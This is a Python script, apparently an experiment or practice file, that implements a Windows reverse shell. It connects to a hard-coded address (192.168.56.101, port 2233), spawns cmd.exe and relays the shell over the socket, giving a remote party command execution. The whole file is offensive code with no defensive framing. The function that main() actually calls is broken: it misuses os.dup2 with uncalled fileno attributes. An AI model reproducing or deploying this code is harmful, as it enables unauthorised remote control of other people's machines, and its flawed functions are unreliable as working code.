import os
import socket
import subprocess
import time
from threading import Thread
from queue import Queue, Empty


def enqueue_output(stdout, qeueu):
    for data in iter(stdout.readline, b""):
        qeueu.put(data)
    stdout.close()


def reverse_shell(address, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((address, port))
    except Exception as e:
        print(f"failed to connect to {address}:{port} {e}")
        os._exit(0)
    shell = r"C:\Windows\System32\cmd.exe"
    proc = subprocess.Popen([shell], close_fds=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    q = Queue()
    t = Thread(target=enqueue_output, args=(proc.stdout, q))
    t.daemon = True
    t.start()
    while True:
        try:
            data = q.get_nowait()
        except Empty:
            print("no output yet")
        else:
            sock.send(data)
            cmd = sock.recv(2048)
            print(cmd)
            if cmd == b"\n":
                continue

            proc.stdin.write(cmd)
            try:
                data = q.get_nowait()
            except Empty:
                print("no data")
            else:
                sock.send(data)


def reverse_shell1(address, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((address, port))
    except Exception as e:
        print(f"failed to connect to {address}:{port} {e}")
        os._exit(0)
    shell = r"C:\Windows\System32\cmd.exe"
    proc = subprocess.Popen([shell], close_fds=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    os.dup2(sock.fileno, proc.stdout.fileno)
    os.dup2(sock.fileno, proc.stdin.fileno)
    os.dup2(sock.fileno, proc.stderr.fileno)

def main():
    address = "192.168.56.101"
    port = 2233
    reverse_shell1(address, port)




def test():

    #proc = subprocess.call([r"C:\Windows\System32\cmd.exe"], shell=True)
    #proc = subprocess.call([r"C:\Windows\System32\cmd.exe"])
    #proc = subprocess.run([r"C:\Windows\System32\cmd.exe"])
    proc = subprocess.Popen([r"C:\Windows\System32\cmd.exe"], stdin=subprocess.PIPE,  stdout=subprocess.PIPE,  stderr=subprocess.PIPE)
    proc.stdin.write(b"dir\n")
    time.sleep(1)
    if proc.stdout.readable():
        print(proc.stdout.read(1024).decode("gbk"))
        #print(os.read(proc.stdout.fileno(), 1024))
    #print(os.read(proc.stdout.fileno(), 1024))
    proc.stdin.write(b"dir\n")
    #print(proc.communicate())
    time.sleep(1)
    if proc.stdout.readable():
        print(proc.stdout.read(1024).decode("gbk"))
        #print(os.read(proc.stdout.fileno(), 1024))
    proc.stdin.write(b"exit\n")
    proc.wait()
    print("ddd")

    


if __name__ == "__main__":
    main()
    #test()



